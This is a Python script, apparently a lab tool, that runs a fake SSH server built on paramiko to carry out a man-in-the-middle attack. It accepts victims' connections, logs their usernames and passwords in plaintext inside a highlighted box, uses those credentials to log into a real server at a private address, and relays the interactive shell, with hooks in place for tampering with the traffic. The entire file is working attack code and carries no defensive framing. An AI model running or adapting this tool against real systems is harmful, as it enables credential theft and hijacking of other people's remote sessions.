import paramiko
import time
import socket
import threading
import logging

# Victim connects to the attacker's port
MITM_HOST = '0.0.0.0'
MITM_PORT = 9090

SERVER_IP = '10.0.2.5'
SERVER_PORT = 22

BUF_LEN = 65536 * 100

logging.basicConfig(level=logging.INFO)
# logging.basicConfig(level=logging.DEBUG)

def forward_stdin(client_channel, server_channel) -> None:
    if client_channel.recv_ready():
        logging.debug(f"[*] forward stdin")
        buf: bytes = client_channel.recv(BUF_LEN)
        buf = stdin(buf)
        server_channel.sendall(buf)

def forward_stdout(client_channel, server_channel) -> None:
    if server_channel.recv_ready():
        logging.debug(f"[*] forward stdout")
        buf: bytes = server_channel.recv(BUF_LEN)
        buf = stdout(buf)
        client_channel.sendall(buf)

def forward_stderr(client_channel, server_channel) -> None:
    if server_channel.recv_stderr_ready():
        logging.debug(f"[*] forward stderr")
        buf: bytes = server_channel.recv_stderr(BUF_LEN)
        buf = stderr(buf)
        client_channel.sendall_stderr(buf)

def stdin(text: bytes) -> bytes:
    return text

def stdout(text: bytes) -> bytes:
    return text

def stderr(text: bytes) -> bytes:
    return text

def connect_to_server(hostname, port, username, password, client) -> int:
    # Automatically add the server's host key (this is not recommended for production)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Connect to the server using the provided hostname, port, username, and password
        client.connect(hostname, port=port, username=username, password=password)

        # Execute a command on the remote server
        # command = 'hostname'  # Example command to list files
        # stdin, stdout, stderr = client.exec_command(command)

        # Get the command output
        # output = stdout.read().decode('utf-8')
        # error = stderr.read().decode('utf-8')

        # print("Command output:")
        # print(output)
        # if error:
            # print("Error output:")
            # print(error)

        return 0
    except paramiko.AuthenticationException:
        print("Authentication failed, please verify your credentials.")
        return paramiko.common.AUTH_FAILED
    except paramiko.SSHException as ssh_exception:
        print(f"Could not establish SSH connection: {ssh_exception}")
    except Exception as e:
        print(f"An error occurred: {e}")

class FakeSSHServer(paramiko.ServerInterface):
    def __init__(self, victim_socket, client):
        self.event = threading.Event()
        self.victim_username = None
        self.victim_password = None
        self.victim_socket = victim_socket  # Store the victim_socket
        self.client = client
        self.channel = None  # Initialize the channel variable

    # first, get_allowed_auths gets called when the client queries which authentication methods are available for a particular username. In this case, the method will return "password", telling the client that it should attempt password-based authentication.
    def get_allowed_auths(self, username):
        return "password"

    # next, check_auth_password will be called when the client attempts to authenticate using a password. The server captures the username and password, logs them, and returns paramiko.AUTH_SUCCESSFUL, meaning the login was successful.
    def check_auth_password(self, username: str, password: str) -> int:
        # logging.info(f"[*] Captured victim credentials: {username}, {password}")
        # define the box width based on the length of the message
        message = f"[*] Captured victim credentials: username: {username}, password: {password}"
        box_width = len(message) + 4  # Add some padding

        # create the box
        box_top_bottom = '*' * box_width
        box_message = f"* {message} *"
        # Add indentation (4 spaces)
        indentation = "    "

        # Log the message in a box with indentation
        logging.info(f"{indentation}{box_top_bottom}")
        logging.info(f"{indentation}{box_message}")
        logging.info(f"{indentation}{box_top_bottom}")

        self.victim_username = username
        self.victim_password = password
        return connect_to_server(SERVER_IP, SERVER_PORT, username, password, self.client)
        # return paramiko.AUTH_SUCCESSFUL
        # return paramiko.AUTH_FAILED
        # Close the victim_socket
        # logging.info("Closing victim socket.")
        # self.victim_socket.close()

    # then, check_channel_request is called when the client requests to open a channel (e.g., for an interactive session). If the request is for a session, it returns paramiko.OPEN_SUCCEEDED, allowing the channel to open.
    def check_channel_request(self, kind: str, chanid: int) -> int:
        logging.debug("check_channel_request: kind=%s , chanid=%s", kind, chanid)
        return paramiko.common.OPEN_SUCCEEDED

    def check_channel_shell_request(self, channel: paramiko.Channel) -> bool:
        logging.debug(f"[*] check_channel_shell_request: channel=%s", channel)
        self.channel = channel
        return True

    def check_channel_pty_request(  # pylint: disable=too-many-arguments
        self,
        channel: paramiko.channel.Channel,
        term: bytes,
        width: int,
        height: int,
        pixelwidth: int,
        pixelheight: int,
        modes: bytes,
    ) -> bool:
        logging.debug(
            f"[*] check_channel_pty_request: channel=%s, term=%s, width=%s, height=%s, pixelwidth=%s, pixelheight=%s, modes=%s",
            channel,
            term,
            width,
            height,
            pixelwidth,
            pixelheight,
            modes,
        )
        return True

    def check_channel_env_request(
        self, channel: paramiko.Channel, name: bytes, value: bytes
    ) -> bool:
        logging.debug(
            "check_channel_env_request: channel=%s, name=%s, value=%s",
            channel,
            name,
            value,
        )
        return True

    def check_channel_subsystem_request(
        self, channel: paramiko.Channel, name: str
    ) -> bool:
        logging.debug(
            "check_channel_subsystem_request: channel=%s, name=%s", channel, name
        )
        return True

def forward_traffic(victim_transport, victim_socket, victim_channel, ssh_client):
    logging.debug(f"[*] Starting forwarding traffic.")
    # Open a session (channel) between the attacker and the real server
    server_channel = ssh_client.get_transport().open_session()

    logging.debug(f"[*] victim channel: channel=%s", victim_channel)
    logging.debug(f"[*] server channel: channel=%s", server_channel)

    # Execute a command (for example)
    # server_channel.exec_command('ifconfig')

    # Read the command output
    # output = server_channel.recv(1024)  # Adjust the buffer size as needed
    # print(output.decode())

    # Set the server channel to interactive mode
    server_channel.get_pty()  # Request a pseudo-terminal
    server_channel.invoke_shell()  # Open an interactive shell

    logging.debug(f"[*] going into loop")
    try:
        while True:

            forward_stdin(victim_channel, server_channel)
            forward_stdout(victim_channel, server_channel)
            forward_stderr(victim_channel, server_channel)
        
            # check if either the victim or server channel is closed
            if victim_channel.closed or server_channel.closed:
                logging.debug("One of the channels is closed. Exiting the loop.")
                break

            time.sleep(0.01)
    except Exception:
        logging.exception("error processing ssh session!")
        raise
    finally:
        if not victim_channel.closed:
            victim_channel.close()
        if not server_channel.closed:
            server_channel.close()

    # Stop the victim transport
    if victim_transport.is_active():
        logging.debug("Stopping victim transport.")
        victim_transport.close()

    victim_socket.close()
    logging.debug("Channels and socket closed gracefully.")


def handle_client(victim_socket, fakeServer, fakeClient):
    logging.debug(f"[*] Starting handling client.")
    # Set up paramiko to handle SSH handshake with the victim client
    victim_transport = paramiko.Transport(victim_socket)
    victim_transport.add_server_key(paramiko.RSAKey.generate(2048))
    victim_transport.start_server(server=fakeServer)
    # Wait for the authentication to complete
    fakeServer.event.wait(4)

    # start the session and forward traffic
    forward_traffic(victim_transport, victim_socket, fakeServer.channel, fakeClient)

def start_mitm_server():
    fake_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    fake_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    fake_server_socket.bind((MITM_HOST, MITM_PORT))
    fake_server_socket.listen(5)
    
    while True:
        try:
            logging.info(f"[*] Waiting for connections on {MITM_HOST}:{MITM_PORT}")
            victim_socket, addr = fake_server_socket.accept()
            logging.info(f"[*] Victim connected from {addr}")

            # create an fake SSH client
            fakeClient = paramiko.SSHClient()

            # handle SSH handshake with the victim
            fakeServer = FakeSSHServer(victim_socket, fakeClient)  # Simulate an SSH server
            handle_client(victim_socket, fakeServer, fakeClient)

        except EOFError:
            victim_socket.close()
            logging.error("[*] Connection closed by the client (EOFError).")
            continue
        except ConnectionResetError as cre:
            victim_socket.close()
            logging.error(f"Connection was reset by the peer: {cre}")
            continue
        except KeyboardInterrupt:
            logging.info(f"[*] Interrupted by user. Closing server socket.")
            break
    
    fake_server_socket.close()
    logging.info(f"[*] Server socket closed.")

if __name__ == "__main__":
    start_mitm_server()

